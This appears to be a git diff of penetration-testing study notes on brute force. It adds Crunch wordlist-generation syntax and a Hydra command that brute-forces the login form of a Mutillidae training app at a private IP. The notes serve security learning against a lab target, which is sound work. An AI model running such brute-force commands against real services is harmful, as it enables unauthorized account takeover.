@@ -1,8 +1,20 @@
 # Brute Force
 
-## Tools
-- Wordlist generator: [Crunch](../Tools/crunch.md)
-- Brute force: [Hydra](../Tools/hydra.md)
+## Crunch (Wordlist generator)
+- Syntax
+  - ```crunch [min]  [max] [characters] -t [pattern] -o [filename]```
+- Example
+  - ```crunch 6 8 123abc$ -i wordlist -t a@@@@b```
+  - ```crunch 6 8 abc12 -o test.txt```
+
+## Hydra (Brute force)
+- Syntax
+  - ```hydra [ip]  -l [usernames] -P [passwords] [service]```
+
+- Example 
+  - ```cmd hydra 10.20.14.212 -l admin -P /root/test.txt http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:F=Not Logged In"```
+
+## Burp is the Best tool !
 
 ## Wordlists
 - ftp://ftp.openwall.com/pub/wordlists/
